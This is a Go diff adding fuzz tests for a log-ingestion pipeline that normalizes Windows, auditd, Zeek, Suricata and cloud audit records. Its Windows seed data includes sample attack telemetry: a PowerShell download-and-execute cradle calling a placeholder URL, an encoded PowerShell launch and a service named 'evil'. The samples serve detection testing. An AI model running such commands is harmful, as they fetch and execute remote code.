@@ -1,11 +1,17 @@
+// Copyright 2026 The Signalith authors
+// SPDX-License-Identifier: Apache-2.0
+
 package ingest
 
 import (
 	"bytes"
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"net/netip"
+	"os"
+	"path/filepath"
 	"regexp"
 	"strconv"
 	"strings"
@@ -86,7 +92,15 @@ func FuzzIngestBody(f *testing.F) {
 		if err != nil {
 			t.Fatalf("checkBody passed, IngestBody: %v", err)
 		}
-		if n > MaxRecords || res.Received != n || res.Indexed != n || len(b.docs) != n {
+		// Each record is a document, and so is each Linux program start
+		// joined from audit records.
+		starts := 0
+		for _, d := range b.docs {
+			if strings.HasSuffix(d.ID, processStartSuffix) && d.Doc["datamodel"] == ProcessStartModel {
+				starts++
+			}
+		}
+		if n > MaxRecords || res.Received != n || res.Indexed != len(b.docs) || len(b.docs)-starts != n {
 			t.Fatalf("%d records: %+v, %d documents", n, res, len(b.docs))
 		}
 		ids := map[string]bool{}
@@ -102,6 +116,12 @@ func FuzzIngestBody(f *testing.F) {
 
 // windowsSeeds are Windows and Sysmon records as Fluent Bit sends them.
 var windowsSeeds = []map[string]any{
+	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": "4724", "StringInserts": []string{"Administrator", "CORP",
+		"S-1-5-21-1-500", "S-1-5-21-1-1104", "eve", "CORP", "0x1a2b"}, "Message": "An attempt was made to reset an account's password."},
+	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4723, "StringInserts": []string{"bob"}},
+	{"Channel": "Security", "Computer": "WS1.corp.local", "EventID": "4731", "StringInserts": []string{"Backup Operators", "WS1",
+		"S-1-5-21-2-1009", "S-1-5-21-1-1104", "eve", "CORP", "0x1a2b", "-", "Backup Operators", "-"}},
+	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4790, "StringInserts": []string{"LdapGroup"}},
 	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4625, "TimeCreated": "2026-10-11 10:00:00 +0000",
 		"StringInserts": []string{"", "", "", "", "S-1-0-0", "administrator", "CORP", "0xC000006D", "", "0xC000006A", "3",
 			"NtLmSsp ", "NTLM", "KALI", "", "", "", "", `C:\Windows\System32\svchost.exe`, "203.0.113.9", "51234"},
@@ -125,6 +145,10 @@ var windowsSeeds = []map[string]any{
 	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
 		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}},
 	WinEventRecord(SystemChannel, "7045", "WS1", now, map[string]string{"ServiceName": "evil", "ImagePath": `C:\evil.exe`}),
+	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4103",
+		"StringInserts": []string{"        Host Application = powershell.exe -nop\r\n        User = CORP\\bob\r\n", "", "CommandInvocation(Get-Process): \"Get-Process\""}},
+	{"Channel": "Windows PowerShell", "Computer": "WS1", "EventID": "400",
+		"StringInserts": []string{"Available", "None", "\tNewEngineState=Available\r\n\tHostApplication=powershell -enc AAA\r\n\tEngineVersion=2.0"}},
 }
 
 func FuzzNormalizeWindows(f *testing.F) {
@@ -255,6 +279,21 @@ func FuzzReadAuditd(f *testing.F) {
 		}
 		for _, k := range []string{"process", "process_path", "process_name", "user"} {
 			checkCapped(t, fs, k, MaxValueLen)
+		}
+		// An EXECVE record is also a program start, joined with the
+		// record itself taken as each other record of the start.
+		tr := &ProcessTracker{}
+		starts := tr.Starts([]Event{ev, ev, ev})
+		if want := map[bool]int{true: 3, false: 0}[rec.Type == "EXECVE"]; len(starts) != want {
+			t.Fatalf("%d starts of %s", len(starts), rec.Type)
+		}
+		for _, st := range starts {
+			if st.Model != "Endpoint" || st.Fields["host"] != fs["host"] || st.Fields["auditd_id"] != rec.Serial {
+				t.Fatalf("start %s %v", st.Model, st.Fields)
+			}
+			for _, k := range []string{"process", "process_path", "process_name", "process_current_directory", "parent_process", "parent_process_path"} {
+				checkCapped(t, st.Fields, k, MaxValueLen)
+			}
 		}
 	})
 }
@@ -420,25 +459,35 @@ func fuzzOTLP(t *testing.T, body []byte, isJSON bool) {
 	if isJSON {
 		walk = walkOTLPJSON
 	}
-	checked := 0
-	checkErr := walk(body, false, func(l *otlpLog, _ int) error {
+	checked, checkBad := 0, 0
+	checkErr := walk(body, false, func(l *otlpLog, _ int, bad *BodyError) error {
 		if l != nil {
 			t.Fatal("the check pass built a record")
 		}
 		checked++
+		if bad != nil {
+			checkBad++
+		}
 		return nil
 	})
-	built := 0
-	buildErr := walk(body, true, func(l *otlpLog, size int) error {
+	built, buildBad := 0, 0
+	buildErr := walk(body, true, func(l *otlpLog, size int, bad *BodyError) error {
+		built++
+		if bad != nil {
+			if l != nil {
+				t.Fatal("a rejected record came with its contents")
+			}
+			buildBad++
+			return nil
+		}
 		if size > MaxRecordBytes {
 			t.Fatalf("record of %d bytes", size)
 		}
 		checkOTLPLog(t, l)
-		built++
 		return nil
 	})
-	if (checkErr == nil) != (buildErr == nil) || checked != built {
-		t.Fatalf("check: %d records, %v; build: %d records, %v", checked, checkErr, built, buildErr)
+	if (checkErr == nil) != (buildErr == nil) || checked != built || checkBad != buildBad {
+		t.Fatalf("check: %d records (%d bad), %v; build: %d records (%d bad), %v", checked, checkBad, checkErr, built, buildBad, buildErr)
 	}
 	b := &countingBulk{keep: true}
 	p := &Pipeline{Store: b, Prefix: "sig", Now: func() time.Time { return now }}
@@ -450,7 +499,7 @@ func fuzzOTLP(t *testing.T, body []byte, isJSON bool) {
 		}
 		return
 	}
-	if err != nil || res.Received != checked || res.Indexed != checked || len(b.docs) != checked {
+	if err != nil || res.Received < checked || res.Rejected != checkBad || res.Indexed != res.Received-checkBad || len(b.docs) != res.Indexed {
 		t.Fatalf("%d records: %+v, %v, %d documents", checked, res, err, len(b.docs))
 	}
 	for _, d := range b.docs {
@@ -485,5 +534,406 @@ func FuzzOTLPProto(f *testing.F) {
 	f.Add([]byte{})
 	f.Fuzz(func(t *testing.T, body []byte) {
 		fuzzOTLP(t, body, false)
+	})
+}
+
+// checkSensorEvent checks an event a network sensor line became: it
+// encodes, its time is in the window once written, and unless the line
+// was not a sensor line at all (sourcetype *:unknown, which goes through
+// the field budget as any JSON does) every field name is one Signalith
+// knows or a valid name, and there are at most maxFieldsPerEvent.
+func checkSensorEvent(t *testing.T, ev Event) {
+	t.Helper()
+	if ev.Model == "" || ev.Fields == nil || ev.Fields["message"] == nil {
+		t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
+	}
+	doc := ev.Document()
+	if _, err := json.Marshal(doc); err != nil {
+		t.Fatal(err)
+	}
+	if st, _ := ev.Fields["sourcetype"].(string); strings.HasSuffix(st, ":unknown") {
+		return
+	}
+	if len(ev.Fields) > maxFieldsPerEvent {
+		t.Fatalf("%d fields", len(ev.Fields))
+	}
+	for k := range ev.Fields {
+		if !KnownField(k) && !validFieldName(k) || strings.Contains(k, ".") {
+			t.Fatalf("field name %q", k)
+		}
+	}
+	if ev.ID != "" && (len(ev.ID) != 32 || strings.Trim(ev.ID, "0123456789abcdef") != "") {
+		t.Fatalf("ID %q", ev.ID)
+	}
+}
+
+func FuzzZeekRecord(f *testing.F) {
+	for _, log := range []string{"conn", "dns", "http", "ssl", "x509", "files", "notice", "capture_loss", "stats", "smb_mapping"} {
+		b, err := os.ReadFile(filepath.Join("testdata", "zeek", log+".json"))
+		if err != nil {
+			f.Fatal(err)
+		}
+		for _, l := range strings.Split(string(b), "\n") {
+			if l != "" {
+				f.Add(log, l)
+			}
+		}
+	}
+	f.Add("weird", `{"ts":"x","uid":7,"id.orig_h":{"a":1},"answers":[[[1]]],"TTLs":"x","duration":"NaN","percent_lost":1e309}`)
+	f.Add("conn", `{"ts":1e30,"id.orig_h":"::ffff:1.2.3.4","conn_state":"OTH","resp_bytes":-1,"service":","}`)
+	f.Fuzz(func(t *testing.T, log, line string) {
+		ev := Normalize("zeek.opt.zeek.logs.current."+log+".log", map[string]any{"log": line, "hostname": "nsm-01"}, now)
+		checkSensorEvent(t, ev)
+		if r, ok := decodeSensorLine(line); ok {
+			checkSensorEvent(t, Normalize("zeek", r, now))
+			checkSensorEvent(t, ParseZeek(log, r, ""))
+		}
+	})
+}
+
+func FuzzSuricataEVE(f *testing.F) {
+	b, err := os.ReadFile(filepath.Join("testdata", "suricata", "eve.json"))
+	if err != nil {
+		f.Fatal(err)
+	}
+	for _, l := range strings.Split(string(b), "\n") {
+		if l != "" {
+			f.Add(l)
+		}
+	}
+	f.Add(`{"timestamp":"2026-10-11T12:00:00Z","event_type":"dns","src_ip":"192.0.2.1","src_port":53,"dns":{"answers":[1,{"rdata":{}}],"grouped":{"A":[[]]},"queries":"x"}}`)
+	f.Add(`{"timestamp":"2026-10-11T12:00:00Z","event_type":"alert","src_ip":1,"alert":{"severity":"x","metadata":[]},"http":"x","flow_id":-1}`)
+	f.Add(`{"timestamp":"2026-10-11T12:00:00Z","event_type":"weird.type-$","src_ip":"192.0.2.1","weird.type-$":{"a":[1,2]}}`)
+	f.Fuzz(func(t *testing.T, line string) {
+		checkSensorEvent(t, Normalize("suricata.eve", map[string]any{"log": line, "hostname": "nsm-01"}, now))
+		if r, ok := decodeSensorLine(line); ok && IsSuricataEVE(r) {
+			checkSensorEvent(t, Normalize("", r, now))
+		}
+	})
+}
+
+func FuzzSensorStatus(f *testing.F) {
+	b, err := os.ReadFile(filepath.Join("testdata", "sensor", "status.json"))
+	if err != nil {
+		f.Fatal(err)
+	}
+	f.Add(strings.TrimSpace(string(b)))
+	f.Add(`{"kind":"signalith-sensor-status","v":1,"zeek":"x","suricata":{"running":"yes"},"rules":{"count":1e300},"interface":{"drop_percent":"NaN"},"warnings":"drops"}`)
+	f.Fuzz(func(t *testing.T, line string) {
+		ev := Normalize(SensorStatusTag, map[string]any{"log": line, "hostname": "nsm-01"}, now)
+		checkSensorEvent(t, ev)
+		if s := ev.Sensor; s != nil {
+			if s.DropPercent < 0 || s.DropPercent > 100 || len(s.Warnings) > maxSensorWarnings || len(s.Interface) > maxSensorWord {
+				t.Fatalf("sensor %+v", s)
+			}
+			if _, err := json.Marshal(s); err != nil {
+				t.Fatal(err)
+			}
+		}
+	})
+}
+
+func FuzzSuricataText(f *testing.F) {
+	b, err := os.ReadFile(filepath.Join("testdata", "suricata", "eve.json"))
+	if err != nil {
+		f.Fatal(err)
+	}
+	for _, l := range strings.Split(string(b), "\n") {
+		if l != "" {
+			f.Add("suricata[1234]: " + l)
+		}
+	}
+	f.Add(`{"event_type":"alert"}`)
+	f.Add(strings.Repeat(" ", 300) + `{"event_type":"alert","timestamp":"x","src_ip":"1"}`)
+	f.Fuzz(func(t *testing.T, text string) {
+		if ev, ok := ParseSuricataText(text); ok {
+			checkSensorEvent(t, ev)
+			if ev.ID == "" {
+				t.Fatal("no ID")
+			}
+		}
+	})
+}
+
+func FuzzAzureRecords(f *testing.F) {
+	f.Add(`{"records": [` + azureSignInRecord + `, ` + azureActivityRecord + `]}`)
+	f.Add(`{"records": [` + azureAuditRecord + `]}`)
+	f.Add(`{"records": [{"time": 1, "category": [], "operationName": {}, "tenantId": null, "properties": [1, {"a": {"b": {"c": {"d": {"e": 1}}}}}]}]}`)
+	f.Add(`{"records": [{"time": "x", "category": "SignInLogs", "operationName": "x", "tenantId": "t", "properties": {"status": "x", "authenticationDetails": [1], "initiatedBy": {"user": 1}}}]}`)
+	f.Fuzz(func(t *testing.T, msg string) {
+		recs := AzureRecords([]byte(msg))
+		for _, r := range recs {
+			ev := ParseAzure(r)
+			if ev.Model == "" || ev.Fields["message"] == nil {
+				t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
+			}
+			if _, err := json.Marshal(ev.Document()); err != nil {
+				t.Fatal(err)
+			}
+			if len(ev.Fields) > maxFieldsPerEvent {
+				t.Fatalf("%d fields", len(ev.Fields))
+			}
+			for k := range ev.Fields {
+				if !KnownField(k) && !validFieldName(k) {
+					t.Fatalf("field name %q", k)
+				}
+			}
+		}
+		b64 := azureFromOTLP(base64.StdEncoding.EncodeToString([]byte(msg)))
+		if len(b64) != len(recs) && strings.HasPrefix(msg, "{") {
+			t.Fatalf("%d records from base64, %d from text", len(b64), len(recs))
+		}
+	})
+}
+
+func FuzzO365Records(f *testing.F) {
+	f.Add(`[` + o365LoginFailed + `, ` + o365InboxRule + `, ` + o365Alert + `]`)
+	f.Add(`[{"Id": 1, "CreationTime": [], "Operation": {}, "Workload": null, "ClientIP": "[::1", "Parameters": "x", "ExtendedProperties": [1, {"Name": 2}]}]`)
+	f.Add(`[{"RecordType": "x", "Operation": "New-", "ResultStatus": 1, "Item": {"A": {"B": {"C": {"D": {"E": {"F": 1}}}}}}}]`)
+	f.Fuzz(func(t *testing.T, msg string) {
+		recs, err := O365Records([]byte(msg))
+		if err != nil {
+			return
+		}
+		for _, r := range recs {
+			ev := Normalize(O365Tag, r, now)
+			if ev.Model == "" {
+				t.Fatalf("no model, fields %v", ev.Fields)
+			}
+			if _, err := json.Marshal(ev.Document()); err != nil {
+				t.Fatal(err)
+			}
+			if len(ev.Fields) > maxFieldsPerEvent {
+				t.Fatalf("%d fields", len(ev.Fields))
+			}
+			for k := range ev.Fields {
+				if !KnownField(k) && !validFieldName(k) {
+					t.Fatalf("field name %q", k)
+				}
+			}
+		}
+	})
+}
+
+func FuzzGCPEntry(f *testing.F) {
+	f.Add(gcpFirewallDelete)
+	f.Add(gcpBucketListDenied)
+	f.Add(gwsGrantAdmin)
+	f.Add(gwsLoginFailure)
+	f.Add(`{"logName": "organizations/1/logs/x", "resource": {}, "protoPayload": {"metadata": {"event": {"eventName": 1, "parameter": [{"name": "A.B", "value": "x"}, {"name": "", "multiValue": [null, {}]}, 3]}}}}`)
+	f.Add(`{"message": {"data": "` + base64.StdEncoding.EncodeToString([]byte(gcpBucketListDenied)) + `"}}`)
+	f.Add(`{"logName": "projects/p/logs/", "resource": {}, "protoPayload": {"status": {"code": "x"}, "authorizationInfo": [1, {"a": [{"b": 2}]}]}, "labels": {"a": {"b": 1}}}`)
+	f.Add(`{"logName": "/logs/%zz", "resource": {"labels": []}, "protoPayload": {"methodName": ".", "request": {"a": {"b": {"c": {"d": {"e": 1}}}}}}}`)
+	f.Add(`{"message": {"data": "` + base64.StdEncoding.EncodeToString([]byte(gcpDeep(1000))) + `"}}`)
+	f.Add(gwsManyEvents(50))
+	f.Fuzz(func(t *testing.T, msg string) {
+		d := json.NewDecoder(strings.NewReader(msg))
+		d.UseNumber()
+		var r map[string]any
+		if d.Decode(&r) != nil || r == nil {
+			return
+		}
+		ev := Normalize(GCPTag, r, now)
+		if GCPEntry(r) == nil {
+			// Not an entry: a generic event, whose names the pipeline's
+			// field checks look after.
+			return
+		}
+		if ev.Model == "" || ev.Fields["message"] == nil {
+			t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
+		}
+		if _, err := json.Marshal(ev.Document()); err != nil {
+			t.Fatal(err)
+		}
+		if len(ev.Fields) > maxFieldsPerEvent {
+			t.Fatalf("%d fields", len(ev.Fields))
+		}
+		for k := range ev.Fields {
+			if !KnownField(k) && !validFieldName(k) {
+				t.Fatalf("field name %q", k)
+			}
+		}
+		// The same text as an OTLP body is an entry only if it is one.
+		if e := gcpFromOTLP(msg); e != nil && !IsGCPRecord(e) {
+			t.Fatalf("entry from text %v", e)
+		}
+	})
+}
+
+func FuzzOktaRecord(f *testing.F) {
+	f.Add(oktaSignInFailed)
+	f.Add(oktaFactorDeactivated)
+	f.Add("[" + oktaThreat + "," + oktaSignInFailed + "]")
+	f.Add(`{"uuid": "u", "published": "p", "eventType": "e", "actor": {}, "target": [1, {"a": [{"b": 2}]}, null], "debugContext": {"debugData": {"a.b": 1, "": 2, "c{}": 3}}}`)
+	f.Add(`{"uuid": 1, "published": 2, "eventType": "user.session.start", "actor": {"alternateId": {"x": 1}}, "outcome": {"result": []}, "client": {"userAgent": "x"}}`)
+	f.Add(`{"uuid": "u", "published": "p", "eventType": "e", "actor": ` + strings.Repeat(`{"a": `, 40) + "1" + strings.Repeat("}", 40) + `}`)
+	f.Fuzz(func(t *testing.T, msg string) {
+		recs, err := OktaRecords([]byte(msg))
+		if err != nil {
+			recs = nil
+		}
+		d := json.NewDecoder(strings.NewReader(msg))
+		d.UseNumber()
+		var r map[string]any
+		if d.Decode(&r) == nil && r != nil {
+			recs = append(recs, r)
+		}
+		for _, r := range recs {
+			ev := Normalize(OktaTag, r, now)
+			if !IsOktaRecord(r) {
+				// Not an event: a generic event, whose names the
+				// pipeline's field checks look after.
+				continue
+			}
+			if ev.Fields["sourcetype"] != OktaSourcetype || ev.Fields["message"] == nil || ev.ID == "" {
+				t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
+			}
+			if _, err := json.Marshal(ev.Document()); err != nil {
+				t.Fatal(err)
+			}
+			if len(ev.Fields) > maxFieldsPerEvent {
+				t.Fatalf("%d fields", len(ev.Fields))
+			}
+			for k := range ev.Fields {
+				if !KnownField(k) && !validFieldName(k) {
+					t.Fatalf("field name %q", k)
+				}
+			}
+		}
+		// The same text as an OTLP body is events only if it holds them.
+		for _, e := range oktaFromOTLP(msg) {
+			if !IsOktaRecord(e) {
+				t.Fatalf("event from text %v", e)
+			}
+		}
+	})
+}
+
+func FuzzKubernetesRecord(f *testing.F) {
+	f.Add(kubePodCreated)
+	f.Add(kubeAnonymous)
+	f.Add(`{"kind": "EventList", "apiVersion": "audit.k8s.io/v1", "items": [` + kubeUnauthenticated + "," + kubeAnonymous + "]}")
+	f.Add("[" + kubeAnonymous + "," + kubeUnauthenticated + "]")
+	f.Add(`{"kind": "Event", "apiVersion": "audit.k8s.io/v1", "auditID": "a", "verb": "v", "stage": "s", "user": "x", "sourceIPs": "y",
+		"objectRef": [1, {"a": [{"b": 2}]}], "annotations": {"a.b": {"c": 1}, "": 2, "c{}": 3, "a.b.c": "d"},
+		"requestObject": {"spec": {"containers": [null, "x", {"image": {"a": 1}}], "a.b": 1}, "metadata": "m"}, "responseObject": [1]}`)
+	f.Add(`{"kind": "Event", "apiVersion": "audit.k8s.io/v1", "auditID": 1, "verb": "create", "stage": "s", "responseStatus": {"code": "x"}}`)
+	f.Add(`{"kind": "Event", "apiVersion": "audit.k8s.io/v1", "auditID": "a", "verb": "v", "stage": "s", "requestObject": ` +
+		strings.Repeat(`{"a": `, 40) + "1" + strings.Repeat("}", 40) + `}`)
+	f.Fuzz(func(t *testing.T, msg string) {
+		recs, err := KubernetesRecords([]byte(msg))
+		if err != nil {
+			recs = nil
+		}
+		d := json.NewDecoder(strings.NewReader(msg))
+		d.UseNumber()
+		var r map[string]any
+		if d.Decode(&r) == nil && r != nil {
+			recs = append(recs, r)
+		}
+		// And as a line Fluent Bit read from the audit log file.
+		if l := kubeLine(map[string]any{"log": msg}); l["log"] == nil {
+			recs = append(recs, l)
+		}
+		for _, r := range recs {
+			ev := Normalize(KubernetesTag, r, now)
+			if !IsKubernetesRecord(r) {
+				// Not an event: a generic event, whose names the
+				// pipeline's field checks look after.
+				continue
+			}
+			if ev.Fields["sourcetype"] != KubernetesSourcetype || ev.Fields["message"] == nil || ev.ID == "" {
+				t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
+			}
+			if _, err := json.Marshal(ev.Document()); err != nil {
+				t.Fatal(err)
+			}
+			if len(ev.Fields) > maxFieldsPerEvent {
+				t.Fatalf("%d fields", len(ev.Fields))
+			}
+			for k := range ev.Fields {
+				if !KnownField(k) && !validFieldName(k) {
+					t.Fatalf("field name %q", k)
+				}
+				if knownObjects[k] {
+					t.Fatalf("value %q where a known field has an object", k)
+				}
+			}
+		}
+		// The same text as an OTLP body is events only if it holds them,
+		// and as a webhook's body an EventList's items are an array.
+		for _, e := range kubernetesFromOTLP(msg) {
+			if !IsKubernetesRecord(e) {
+				t.Fatalf("event from text %v", e)
+			}
+		}
+		if items, ok := kubeEventListItems([]byte(msg)); ok && (len(items) == 0 || items[0] != '[') {
+			t.Fatalf("items %q", items)
+		}
+	})
+}
+
+func FuzzGitHubEvent(f *testing.F) {
+	f.Add(githubRepoDestroy)
+	f.Add(githubDisable2FA)
+	f.Add("[" + githubFailedLogin + "," + githubDisable2FA + "]")
+	f.Add(strings.ReplaceAll(githubDisable2FA, "\n", "") + "\n" + strings.ReplaceAll(githubFailedLogin, "\n", ""))
+	f.Add(`{"action": "a.b", "created_at": "x", "org": {"a": [1, {"b": [{"c": 2}]}, null]}, "actor": {"x": 1}, "src": {"y": 2}, "github_actor": [1], "": 3, "a.b": 4, "_": 5, "@": 6}`)
+	f.Add(`{"action": "repo.create", "@timestamp": 1e300, "created_at": -1, "business": 1, "user": {"login": "x"}, "user_agent": [{"a": 1}]}`)
+	f.Add(`{"action": "repo.create", "created_at": 1, "org": ` + strings.Repeat(`{"a": `, 40) + "1" + strings.Repeat("}", 40) + `}`)
+	f.Fuzz(func(t *testing.T, msg string) {
+		recs, err := GitHubRecords([]byte(msg))
+		if err != nil {
+			recs = nil
+		}
+		d := json.NewDecoder(strings.NewReader(msg))
+		d.UseNumber()
+		var r map[string]any
+		if d.Decode(&r) == nil && r != nil {
+			recs = append(recs, r)
+		}
+		for _, r := range recs {
+			ev := Normalize(GitHubTag, r, now)
+			if !isGitHubEvent(r) {
+				// Not an event: a generic event, whose names the
+				// pipeline's field checks look after.
+				continue
+			}
+			if ev.Fields["sourcetype"] != GitHubSourcetype || ev.Fields["message"] == nil || ev.ID == "" {
+				t.Fatalf("model %q fields %v", ev.Model, ev.Fields)
+			}
+			if _, err := json.Marshal(ev.Document()); err != nil {
+				t.Fatal(err)
+			}
+			if len(ev.Fields) > maxFieldsPerEvent {
+				t.Fatalf("%d fields", len(ev.Fields))
+			}
+			for k, v := range ev.Fields {
+				if !KnownField(k) && !validFieldName(k) {
+					t.Fatalf("field name %q", k)
+				}
+				if _, isMap := v.(map[string]any); isMap || knownObjects[k] {
+					t.Fatalf("field %s holds a value where an object is mapped", k)
+				}
+				// ({} is part of a name: config{} is not config.)
+				for i := range len(k) {
+					if k[i] != '.' {
+						continue
+					}
+					if typ, ok := knownFields[k[:i]]; ok && typ != "object" {
+						t.Fatalf("%s is under %s, mapped as %s", k, k[:i], typ)
+					}
+					if _, ok := ev.Fields[k[:i]]; ok {
+						t.Fatalf("%s is under the field %s", k, k[:i])
+					}
+				}
+			}
+		}
+		// The same text as an OTLP body is events only if it holds them.
+		for _, e := range githubFromOTLP(msg) {
+			if !IsGitHubRecord(e) {
+				t.Fatalf("event from text %v", e)
+			}
+		}
 	})
 }
